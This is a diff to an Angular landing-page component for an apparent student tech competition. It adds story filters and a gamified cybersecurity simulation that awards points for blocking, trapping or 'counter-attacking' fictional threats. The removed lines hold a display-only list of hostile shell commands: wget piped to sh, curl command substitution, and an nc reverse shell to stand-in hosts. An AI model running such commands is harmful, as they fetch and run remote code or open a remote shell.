@@ -1,7 +1,7 @@
 import { getAuthValue, setAuthValue } from '../../services/session.util';
 import { Component, OnInit, AfterViewInit, OnDestroy, NgZone, ElementRef, ViewChild, Renderer2, ChangeDetectorRef, ChangeDetectionStrategy } from '@angular/core';
 import { CommonModule, DecimalPipe } from '@angular/common';
-import { Router, RouterLink } from '@angular/router';
+import { Router, RouterLink, ActivatedRoute } from '@angular/router';
 import { FormsModule } from '@angular/forms';
 import { ThemeService } from '../../services/theme.service';
 import { ContentService } from '../../services/content.service';
@@ -225,6 +225,7 @@ export class LandingComponent implements OnInit, AfterViewInit, OnDestroy {
   countdownTick = false;
   private countdownInterval: any;
   private storyTimer: any;
+  currentStoryOffset = 0;
 
   // ── COMPETITIONS HERO + GRID ─────────────────────────────────
   get featuredCompetition(): any | null {
@@ -955,6 +956,7 @@ print(f"[!] FLAG{{NTIC{{{decoded.split('-')[-1]}}}}}")`,
 
   constructor(
     private router: Router,
+    private route: ActivatedRoute,
     private ngZone: NgZone,
     private elementRef: ElementRef,
     public themeService: ThemeService,
@@ -1056,6 +1058,9 @@ print(f"[!] FLAG{{NTIC{{{decoded.split('-')[-1]}}}}}")`,
     this.startCompSlideshow();
     this.typeProblem();
     this.setupFabScroll();
+    if (this.route.snapshot.fragment === 'news') {
+      setTimeout(() => this.scrollToSection('news'), 600);
+    }
   }
 
   ngAfterViewInit(): void {
@@ -1063,7 +1068,13 @@ print(f"[!] FLAG{{NTIC{{{decoded.split('-')[-1]}}}}}")`,
     this.startMatrixRain();
     this.applyRegionColors();
     this.setupScrollAnimations();
-    this.storyTimer = setInterval(() => this.cdr.detectChanges(), 30_000);
+    this.storyTimer = setInterval(() => {
+      const stories = this.filteredStories;
+      if (stories.length > 5) {
+        this.currentStoryOffset = (this.currentStoryOffset + 1) % stories.length;
+        this.cdr.detectChanges();
+      }
+    }, 6_000);
 
     // Pause matrix rain when off-screen to save CPU
     this.setupMatrixRainObserver();
@@ -3635,37 +3646,56 @@ for (let i = people.length - 1; i > 0; i--) {
       }
     } else if (track === 'cyber') {
       if (actionType === 'defend') {
-        state.blockedCount += Math.floor(Math.random() * 5) + 3;
-        state.packetsSec = Math.floor(Math.random() * 1500) + 5000;
-        state.activeThreats = Math.max(0, (state.activeThreats || 3) - 1);
-        state.status = '🛡️ CMD INJECTION PAYLOAD NEUTRALIZED';
+        state.blockedCount = (state.blockedCount || 0) + 1;
+        state.ctfScore = (state.ctfScore || 850) + 50;
+        state.activeThreats = Math.max(0, (state.activeThreats || 1) - 1);
+        state.shieldPulseActive = true;
+        setTimeout(() => { state.shieldPulseActive = false; }, 1500);
+
+        state.status = '🛡️ WAF RULE ENFORCED • ATTACK IP SHUNNED';
         state.statusColor = '#00e676';
-        const payloads = ['wget http://malicious.c2/bot.sh | sh', '$(curl -s evil.io/ransom)', '; nc -e /bin/sh 10.0.0.1 4444'];
-        const p = payloads[Math.floor(Math.random() * payloads.length)];
-        state.log = `WAF blocked payload: "${p}". Sig ID 958012 triggered. ${state.blockedCount} attacks neutralized today.`;
-      } else if (actionType === 'ddos') {
-        state.packetsSec = Math.floor(Math.random() * 600) + 800;
-        state.activeThreats = (state.activeThreats || 3) + (Math.random() > 0.5 ? 1 : 0);
-        state.ipsAlerts = (state.ipsAlerts || 2) + 1;
-        state.status = '⚡ SYN FLOOD SCRUBBING ACTIVE • 32 Gbps';
-        state.statusColor = '#38bdf8';
-        const vectors = ['DNS amplification (53/udp)', 'NTP reflection (123/udp)', 'Memcached amp (11211/tcp)', 'CLDAP reflection (389/udp)'];
-        const v = vectors[Math.floor(Math.random() * vectors.length)];
-        state.log = `Volumetric ${v} detected from 12,400+ spoofed IPs. BGP flowspec rule injected. Traffic normalizing.`;
+        state.log = `[WAF DROP] Blocked ${state.lastAttackType || 'RCE Probe'} from ${state.lastAttackerIp || '185.220.101.34'}. TCP RST injected. +50 CTF Pts. Total Blocked: ${state.blockedCount}.`;
       } else if (actionType === 'honeypot') {
-        state.blockedCount += 1;
         state.honeypotDecoys = (state.honeypotDecoys || 5) + 1;
-        state.status = '🍯 ATTACKER TRAPPED IN DECOY NETWORK';
+        state.ctfScore = (state.ctfScore || 850) + 75;
+        state.honeypotTrapActive = true;
+        setTimeout(() => { state.honeypotTrapActive = false; }, 1500);
+
+        state.status = '🪤 ATTACKER TRAPPED IN COWRIE TARSAND DECOY';
         state.statusColor = '#ffea00';
-        const ips = ['45.33.32.156', '103.224.182.241', '185.220.101.34', '91.121.87.23'];
-        const ip = ips[Math.floor(Math.random() * ips.length)];
-        state.log = `SSH brute-force from ${ip} redirected to Cowrie honeypot. Session captured: 142 commands logged. IP blackholed.`;
+        state.log = `[SANDBOX ISOLATION] Attacker ${state.lastAttackerIp || '103.224.182.241'} redirected to isolated honeypot container. Capturing keystrokes (42 cmds logged). +75 CTF Pts.`;
+      } else if (actionType === 'counter_attack') {
+        state.counterStrikes = (state.counterStrikes || 0) + 1;
+        state.ctfScore = (state.ctfScore || 850) + 150;
+        state.activeThreats = Math.max(0, (state.activeThreats || 1) - 1);
+        state.counterBeamActive = true;
+        state.c2Destroyed = true;
+        setTimeout(() => { state.counterBeamActive = false; }, 2500);
+        setTimeout(() => { state.c2Destroyed = false; }, 4500);
+
+        state.status = '💥 COUNTER-STRIKE DEPLOYED • ATTACKER C2 SERVER DESTROYED!';
+        state.statusColor = '#d500f9';
+        state.log = `⚡ [COUNTER-ATTACK SUCCESS] Traced origin to ${state.lastAttackerLoc || 'Moscow, RU'} [${state.lastAttackerIp || '185.220.101.34'}]. Fired zero-day counter-payload. Attacker C2 Botnet Node NEUTRALIZED! +150 CTF Pts!`;
       } else if (actionType === 'cipher') {
-        const ciphers = ['AES-256-GCM (TLS 1.3)', 'ChaCha20-Poly1305', 'ECDHE_x25519', 'Kyber-1024 (PQC)'];
+        const ciphers = ['AES-256-GCM (TLS 1.3)', 'ChaCha20-Poly1305', 'ECDHE_x25519', 'Kyber-1024 Quantum PQC'];
         state.encryption = ciphers[Math.floor(Math.random() * ciphers.length)];
-        state.status = '🔐 SESSION KEYS ROTATED • PERFECT FORWARD SECRECY';
-        state.statusColor = '#0088cc';
-        state.log = `TLS certificates rotated. ${state.encryption} cipher suite activated. 0 ms handshake overhead. PFS enforced.`;
+        state.ctfScore = (state.ctfScore || 850) + 30;
+        state.status = '🔐 QUANTUM-RESISTANT KEYS ROTATED • PFS ENFORCED';
+        state.statusColor = '#38bdf8';
+        state.log = `[KEY ROTATION] Flushed 1,024 compromised tokens. ${state.encryption} cipher suite activated. Handshake latency 0 ms. +30 CTF Pts.`;
+      } else if (actionType === 'toggle_sim') {
+        state.liveSimRunning = !state.liveSimRunning;
+        if (state.liveSimRunning) {
+          state.status = '⚡ LIVE THREAT GENERATOR ACTIVE • SIMULATING HACK ATTACKS';
+          state.statusColor = '#ff1744';
+          state.log = '[SIMULATION ENGAGED] Real-time cyber warfare stream active. Incoming hacker probes detected!';
+          this.startCyberThreatGenerator();
+        } else {
+          state.status = '⏸️ THREAT GENERATOR PAUSED';
+          state.statusColor = '#94a3b8';
+          state.log = '[SIMULATION PAUSED] Live threat stream paused.';
+          if (this.cyberSimInterval) clearInterval(this.cyberSimInterval);
+        }
       }
     } else if (track === 'innovation') {
       if (actionType === 'solar') {
@@ -3704,10 +3734,40 @@ for (let i = people.length - 1; i > 0; i--) {
         state.efficiency = Math.min(99.9, currentEfficiency + Math.random() * 0.3 + 0.1).toFixed(1) + '%';
         state.co2Saved += Math.floor(Math.random() * 60) + 30;
         state.status = '🌍 IOT SMART GRID FULLY SYNCHRONIZED';
-        state.statusColor = '#00a86b';
-        state.log = `Total carbon emission reduction offset reached ${state.co2Saved} kg across 16 synchronized municipal IoT nodes.`;
       }
     }
+  }
+
+  private cyberSimInterval: any;
+
+  startCyberThreatGenerator(): void {
+    if (this.cyberSimInterval) clearInterval(this.cyberSimInterval);
+    const threats = [
+      { ip: '185.220.101.34', loc: 'Moscow, RU', type: 'Ransomware LockBit 3.0 Payload', port: 443 },
+      { ip: '175.45.176.8', loc: 'Pyongyang, KP', type: 'Zero-Day Buffer Overflow (CVE-2024-6387)', port: 22 },
+      { ip: '103.224.182.241', loc: 'Beijing, CN', type: 'DDoS SYN Flood (15,000 Botnet IPs)', port: 80 },
+      { ip: '91.121.87.23', loc: 'Frankfurt, DE', type: 'SQL Injection Authentication Bypass', port: 8080 },
+      { ip: '194.26.29.112', loc: 'Saint Petersburg, RU', type: 'DNS Exfiltration Tunnel Probe', port: 53 }
+    ];
+
+    this.cyberSimInterval = setInterval(() => {
+      const state = this.arenaState.cyber;
+      if (!state || !state.liveSimRunning) {
+        if (this.cyberSimInterval) clearInterval(this.cyberSimInterval);
+        return;
+      }
+
+      const t = threats[Math.floor(Math.random() * threats.length)];
+      state.lastAttackerIp = t.ip;
+      state.lastAttackerLoc = t.loc;
+      state.lastAttackType = t.type;
+      state.activeThreats = (state.activeThreats || 0) + 1;
+      state.ipsAlerts = (state.ipsAlerts || 2) + 1;
+      state.packetsSec = Math.floor(Math.random() * 2500) + 4000;
+      state.status = `🚨 CRITICAL THREAT: ${t.type} from ${t.loc}`;
+      state.statusColor = '#ff1744';
+      state.log = `⚠️ [INTRUSION ALERT] Hostile payload detected from ${t.loc} [${t.ip}] targeting Port ${t.port}. React with BLOCK, TRAP, or ATTACK BACK!`;
+    }, 4200);
   }
 
   private syntaxHighlight(code: string): string {
@@ -3938,6 +3998,39 @@ for (let i = people.length - 1; i > 0; i--) {
 
   trackByStory(index: number, story: any): string {
     return story.id;
+  }
+
+  activeStoryFilter = 'all';
+  storySectionDark = false;
+  storyFilters = [
+    { key: 'all', label: 'All Stories', icon: 'apps' },
+    { key: 'coding', label: 'Coding', icon: 'data_object' },
+    { key: 'robotics', label: 'Robotics', icon: 'memory' },
+    { key: 'ai', label: 'AI', icon: 'model_training' },
+    { key: 'cyber', label: 'Cybersecurity', icon: 'security' },
+    { key: 'innovation', label: 'Innovation', icon: 'tips_and_updates' },
+  ];
+
+  setStoryFilter(key: string): void {
+    this.activeStoryFilter = key;
+    this.currentStoryOffset = 0;
+  }
+
+  toggleStoryTheme(): void {
+    this.storySectionDark = !this.storySectionDark;
+  }
+
+  get filteredStories(): any[] {
+    const all = this.contentService.championshipStories;
+    if (this.activeStoryFilter === 'all') return all;
+    return all.filter(s => s.tagColor === this.activeStoryFilter || s.tag?.toLowerCase().includes(this.activeStoryFilter));
+  }
+
+  get displayStories(): any[] {
+    const stories = this.filteredStories;
+    if (!stories.length) return [];
+    const offset = this.currentStoryOffset % stories.length;
+    return [...stories.slice(offset), ...stories.slice(0, offset)];
   }
 
   isLikedByUser(story: any): boolean {
